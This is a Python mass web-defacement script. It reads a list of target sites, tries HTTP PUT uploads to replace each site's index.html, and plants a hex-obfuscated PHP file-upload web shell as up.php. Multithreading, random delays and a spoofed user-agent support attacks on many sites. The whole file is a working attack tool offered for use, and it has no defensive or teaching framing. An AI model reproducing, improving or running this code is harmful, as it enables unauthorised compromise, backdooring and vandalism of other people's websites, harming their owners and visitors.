#!/usr/bin/env python3
"""
WEB DEFACEMENT TOOL - ORIGINAL VERSION FIX
Features:
- Processes targets from listsite.txt
- Deploys index.html as deface page
- Uses up.php for uploads
- Proxy support with authentication
- Multi-threaded operation
"""

import os
import sys
import requests
import random
import time
import socket
import socks
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# Configuration
MAX_THREADS = 15
REQUEST_TIMEOUT = 10
RETRY_COUNT = 2
JITTER = (0.5, 1.5)

# Color coding
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# Your original PHP payload
PHP_PAYLOAD = """<?php ${"\x47L\x4f\x42\x41\x4cS"}["\x74\x72\x76\x66\x6a\x76y\x75pf"]="c\x77\x64";echo "\x47\x49F\x389a ;\n\x3ct\x69t\x6ce\x3eByp\x61\x73\x73\x20\x75p\x6c\x6f\x61d\x65r!r\x3c/ti\x74le\x3e\n<br\x3e\n";echo"\x55\x6e\x61\x6de:".php_uname()."\x3c\x62r>".${${"G\x4cO\x42\x41\x4cS"}["\x74r\x76\x66\x6a\x76\x79\x75p\x66"]}=getcwd();Echo"\x3c\x63\x65n\x74e\x72\x3e<\x66or\x6d\x20\x61\x63t\x69on=\x22\x22 m\x65\x74h\x6f\x64\x3d\x22\x70os\x74\"\x20encty\x70e=\x22mu\x6cti\x70\x61\x72t/\x66\x6fr\x6d-\x64\x61ta\x22\x20\x6ea\x6de=\x22up\x6c\x6fader\" i\x64\x3d\"\x75p\x6c\x6fa\x64er\">";echo"\x3cin\x70\x75\x74 \x74\x79p\x65=\"fi\x6ce\" \x6e\x61me=\x22f\x69l\x65\"\x20s\x69\x7a\x65=\"5\x30\"\x3e\x3ci\x6ep\x75\x74 \x6ea\x6d\x65=\"\x5fupl\x22 t\x79p\x65=\"sub\x6d\x69t\" \x69d\x3d\"\x5f\x75\x70\x6c\" \x76alue\x3d\x22Upload\">\x3c/\x66or\x6d\x3e";if($_POST["_\x75\x70\x6c"]=="U\x70l\x6f\x61\x64"){if(@copy($_FILES["\x66\x69l\x65"]["\x74\x6dp\x5f\x6e\x61\x6de"],$_FILES["\x66\x69l\x65"]["\x6e\x61me"])){echo"<\x62>\x53hell \x55\x70\x6c\x6f\x61ded\x20!\x20:)<\x62><br><br>";}else{echo"\x3cb>Not\x20\x75p\x6c\x6f\x61ded\x20! </b>\x3cbr\x3e\x3cb\x72>";}}?>"""

class WebDefacer:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        self.success_count = 0
        self.failed_count = 0

    def _random_delay(self):
        time.sleep(random.uniform(*JITTER))

    def _try_request(self, method, url, **kwargs):
        for _ in range(RETRY_COUNT):
            try:
                self._random_delay()
                return self.session.request(
                    method,
                    url,
                    timeout=REQUEST_TIMEOUT,
                    allow_redirects=False,
                    **kwargs
                )
            except (requests.RequestException, socks.SOCKS5Error):
                continue
        return None

    def deploy_payload(self, target):
        # First try direct PUT method
        index_url = urljoin(target, "index.html")
        response = self._try_request('PUT', index_url, data=open('index.html').read())
        
        if response and response.status_code in [200, 201]:
            verify = self._try_request('GET', index_url)
            if verify and verify.status_code == 200:
                self.success_count += 1
                print(f"{Colors.GREEN}[+] Defaced: {index_url}{Colors.RESET}")
                return True

        # Then try PHP uploader
        upload_url = urljoin(target, "up.php")
        files = {'file': ('index.html', open('index.html').read())}
        response = self._try_request('POST', upload_url, files=files)
        
        if response and response.status_code == 200:
            verify_url = urljoin(target, "index.html")
            verify = self._try_request('GET', verify_url)
            if verify and verify.status_code == 200:
                self.success_count += 1
                print(f"{Colors.GREEN}[+] Defaced via uploader: {verify_url}{Colors.RESET}")
                return True

        self.failed_count += 1
        print(f"{Colors.RED}[-] Failed: {target}{Colors.RESET}")
        return False

    def deploy_uploader(self, target):
        uploader_url = urljoin(target, "up.php")
        response = self._try_request('PUT', uploader_url, data=PHP_PAYLOAD)
        
        if response and response.status_code in [200, 201]:
            verify = self._try_request('GET', uploader_url)
            if verify and verify.status_code == 200:
                print(f"{Colors.GREEN}[+] Uploader deployed: {uploader_url}{Colors.RESET}")
                return True
        return False

def main():
    # Check required files
    if not os.path.exists('listsite.txt'):
        print(f"{Colors.RED}[!] Missing listsite.txt{Colors.RESET}")
        return
    if not os.path.exists('index.html'):
        print(f"{Colors.RED}[!] Missing index.html{Colors.RESET}")
        return

    # Load targets
    with open('listsite.txt') as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"{Colors.CYAN}[*] Starting on {len(targets)} targets{Colors.RESET}")

    defacer = WebDefacer()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # First deploy uploaders
        futures = [executor.submit(defacer.deploy_uploader, target) for target in targets]
        for future in futures:
            future.result()

        # Then deploy deface pages
        futures = [executor.submit(defacer.deploy_payload, target) for target in targets]
        for future in futures:
            future.result()

    print(f"\n{Colors.CYAN}[*] Operation complete{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Success: {defacer.success_count}{Colors.RESET}")
    print(f"{Colors.RED}[-] Failed: {defacer.failed_count}{Colors.RESET}")

if __name__ == "__main__":
    print(f"""{Colors.PURPLE}
  ____      _    ___ ___ _   _ _____ 
 / ___|    / \  |_ _/ _ \ | | |_   _|
| |  _    / _ \  | | | | | | | | | |  
| |_| |  / ___ \ | | |_| | |_| | | |  
 \____| /_/   \_\___\___/ \___/  |_|  
    {Colors.RESET}""")
    main()
